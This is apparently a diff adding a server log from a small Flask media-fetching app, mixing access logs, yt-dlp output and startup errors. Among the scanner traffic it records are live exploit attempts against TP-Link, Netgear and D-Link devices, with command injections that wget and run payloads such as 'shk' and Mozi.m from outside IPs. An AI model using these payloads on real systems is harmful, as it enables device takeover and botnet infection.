+127.0.0.1 - - [15/May/2024 04:43:44] "GET //media/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:44] "GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:44] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:45] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:45] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:48:18] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 04:48:18] "GET /series.json HTTP/1.0" 304 -
+127.0.0.1 - - [15/May/2024 04:48:18] "GET /favicon.ico HTTP/1.0" 404 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 04:48:29] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 04:53:09] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:53:10] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 04:53:58] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 04:58:57] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:03:06] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Vbzdt6K6n1A
+[youtube] Vbzdt6K6n1A: Downloading webpage
+[youtube] Vbzdt6K6n1A: Downloading ios player API JSON
+[youtube] Vbzdt6K6n1A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Vbzdt6K6n1A")
+[youtube] Vbzdt6K6n1A: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 05:03:17] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:04:45] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 05:11:39] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 05:11:53] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:13:58] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:20:49] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:21:08] "GET //code.jquery.com/jquery-3.5.1.slim.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 05:27:27] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:28:57] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:28:58] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 05:28:58] "GET / HTTP/1.0" 200 -
+45.156.128.37 - - [15/May/2024 05:29:52] code 400, message Bad request version ('À\x14À')
+45.156.128.37 - - [15/May/2024 05:29:52] "\x16\x03\x01\x00\x9d\x01\x00\x00\x99\x03\x03\x17»T\x9b?,g\x1dÝ\x0e)ì¸Ú\x1eDmï\x05\x96\x10\x83f\x8cs]Fi\x91Äë£\x00\x00BÀ\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/May/2024 05:44:00] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:45:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 05:50:39] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://193.233.203.237/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 05:52:52] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 05:59:00] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:01:08] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:01:09] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:01:09] "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:09] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:01:10] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:10] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:10] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:11] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:11] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:11] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:12] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:12] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:12] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:13] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:13] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:13] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:14] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:14] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:14] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:01:15] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:10:41] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:10:59] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:10:59] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:14:02] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:14:03] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:14:27] "GET //code.jquery.com/jquery-3.5.1.slim.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:16:11] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:20:14] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:20:19] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:20:19] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:25:59] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:27:44] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:27:44] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 06:29:01] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:29:29] "HEAD / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:32:41] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:33:33] "GET / HTTP/1.0" 200 -
+198.235.24.113 - - [15/May/2024 06:34:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/May/2024 06:44:03] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:45:14] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:45:15] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:45:21] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:45:21] "GET /favicon.ico HTTP/1.0" 404 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 06:45:46] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:49:25] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:55:52] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 06:55:52] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 06:57:17] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 06:59:04] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 07:14:05] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 07:15:40] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 07:17:51] "GET /webui/ HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 07:19:08] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 07:20:05] "GET /geoserver/web/ HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 07:28:15] "GET /actuator/gateway/routes HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 07:29:07] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 07:34:37] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://193.233.203.237/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 07:37:38] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 07:37:39] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 07:41:35] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 07:44:07] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 07:59:09] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:12:30] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 08:14:09] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:26:05] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 08:29:11] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:32:44] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 08:32:44] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:40:33] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 08:40:33] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 08:44:12] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:46:59] "GET /muieblackcat HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 08:47:26] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://193.233.203.237/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 08:49:43] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:49:46] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:49:47] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:49:47] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:49:47] "GET /favicon.ico HTTP/1.0" 404 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 08:50:15] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 08:59:12] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:09:41] "GET / HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=oUpWAKZ6aQs
+[youtube] oUpWAKZ6aQs: Downloading webpage
+[youtube] oUpWAKZ6aQs: Downloading ios player API JSON
+[youtube] oUpWAKZ6aQs: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "oUpWAKZ6aQs")
+[youtube] oUpWAKZ6aQs: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 09:14:04] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:14:14] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:14:29] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:14:33] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:14:33] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 09:14:38] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:14:41] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:14:41] "GET /favicon.ico HTTP/1.0" 404 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 09:14:48] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 09:15:04] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:16:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:19:46] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 09:29:15] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:34:05] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:36:18] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:40:10] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:44:15] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:49:01] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:49:19] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 09:49:20] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 09:49:20] "GET /sitemap.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 09:51:50] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:51:51] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:51:51] "GET /favicon.ico HTTP/1.0" 404 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [15/May/2024 09:51:58] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:55:41] "GET /series.json HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [15/May/2024 09:55:45] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:57:53] "GET /series.json HTTP/1.0" 200 -
+[twitch:vod] Extracting URL: https://www.twitch.tv/videos/2145582269
+[twitch:vod] 2145582269: Downloading stream metadata GraphQL
+[twitch:vod] 2145582269: Downloading video access token GraphQL
+[twitch:vod] 2145582269: Downloading m3u8 information
+[twitch:vod] 2145582269: Downloading storyboard metadata JSON
+127.0.0.1 - - [15/May/2024 09:57:58] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 09:59:17] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:00:36] "GET /series.json HTTP/1.0" 200 -
+[twitch:stream] Extracting URL: https://www.twitch.tv/mrpokke
+[twitch:stream] mrpokke: Downloading stream GraphQL
+[twitch:stream] mrpokke: Downloading stream access token GraphQL
+[twitch:stream] mrpokke: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 10:00:39] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:00:43] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 10:14:15] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:20:30] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:29:18] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:36:40] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:36:43] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:39:53] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:44:20] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:49:21] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:57:58] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:57:58] "GET /series.json HTTP/1.0" 200 -
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5001
+ * Running on http://135.148.27.168:5001
+Press CTRL+C to quit
+127.0.0.1 - - [15/May/2024 10:59:35] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 10:59:36] "GET /series.json HTTP/1.0" 304 -
+[twitch:stream] Extracting URL: https://www.twitch.tv/mrpokke
+[twitch:stream] mrpokke: Downloading stream GraphQL
+[twitch:stream] mrpokke: Downloading stream access token GraphQL
+[twitch:stream] mrpokke: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 10:59:41] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 10:59:56] "POST /get_media HTTP/1.0" 200 -
+[twitch:stream] Extracting URL: https://www.twitch.tv/mrpokke
+[twitch:stream] mrpokke: Downloading stream GraphQL
+[twitch:stream] mrpokke: Downloading stream access token GraphQL
+[twitch:stream] mrpokke: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 11:00:12] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading player 74a3a562
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [15/May/2024 11:01:19] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 11:04:27] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 11:04:27] "GET /series.json HTTP/1.0" 200 -
+[generic] Extracting URL: https://fb.watch/s4k18AnMaK/
+[generic] s4k18AnMaK: Downloading webpage
+ERROR: [generic] Unable to download webpage: HTTP Error 302: Found (redirect loop detected) (caused by <HTTPError 302: Found>)
+127.0.0.1 - - [15/May/2024 11:04:34] "POST /get_media HTTP/1.0" 500 -
+[generic] Extracting URL: https://fb.watch/s4k18AnMaK/
+[generic] s4k18AnMaK: Downloading webpage
+ERROR: [generic] Unable to download webpage: HTTP Error 302: Found (redirect loop detected) (caused by <HTTPError 302: Found>)
+127.0.0.1 - - [15/May/2024 11:06:51] "POST /get_media HTTP/1.0" 500 -
+127.0.0.1 - - [15/May/2024 11:14:21] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 11:22:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 11:37:22] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://14.225.204.172/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 11:40:44] "GET / HTTP/1.0" 200 -
+65.49.1.63 - - [15/May/2024 11:50:04] code 400, message Bad request version ('À\x14À')
+65.49.1.63 - - [15/May/2024 11:50:04] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ÚdNº{\x0fÝP'KÔ"5ÿw\x00\x0c\x068¼ÙõH} HÒZ0\x9bÛ)\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/May/2024 11:53:52] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 11:58:45] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 12:00:48] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 12:02:55] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 12:03:54] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 12:16:00] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://14.225.204.172/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 12:25:46] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 13:02:00] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 13:02:27] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 13:02:27] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 13:12:49] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.206.182.32:49164/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5001
+ * Running on http://135.148.27.168:5001
+Press CTRL+C to quit
+127.0.0.1 - - [15/May/2024 13:15:45] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 13:15:45] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 13:17:01] "GET / HTTP/1.0" 200 -
+Traceback (most recent call last):
+  File "app.py", line 2, in <module>
+    from flask_cors import CORS
+ModuleNotFoundError: No module named 'flask_cors'
+Traceback (most recent call last):
+  File "app.py", line 2, in <module>
+    from flask_cors import CORS
+ModuleNotFoundError: No module named 'flask_cors'
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5001
+ * Running on http://135.148.27.168:5001
+Press CTRL+C to quit
+127.0.0.1 - - [15/May/2024 22:17:23] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 22:17:23] "GET /series.json HTTP/1.0" 200 -
+[WatchESPN] Extracting URL: https://www.espn.com/espnplus/player/_/id/2f816cdb-a5e6-4c00-9c5d-d81bbea903a1#bucketId=7294
+[WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: Downloading JSON metadata
+ERROR: [WatchESPN] 2f816cdb-a5e6-4c00-9c5d-d81bbea903a1: This video is only available for registered users. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies
+127.0.0.1 - - [15/May/2024 22:17:27] "POST /get_media HTTP/1.0" 500 -
+127.0.0.1 - - [15/May/2024 22:28:13] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 22:32:17] "GET /admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:46:09] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://14.225.204.172/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:46:47] "GET /.most/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cHMJfAlncmVwCW15ZGxpbms= HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:46:48] "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cHMJfAlncmVwCW15ZGxpbms= HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:46:48] "GET /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=cHMJfAlncmVwCW15ZGxpbms= HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:46:48] "GET /.most/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=cHMJfAlncmVwCW15ZGxpbms= HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:48:24] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:48:51] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 22:48:53] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:49:49] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 22:49:50] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 22:50:30] "GET / HTTP/1.0" 200 -
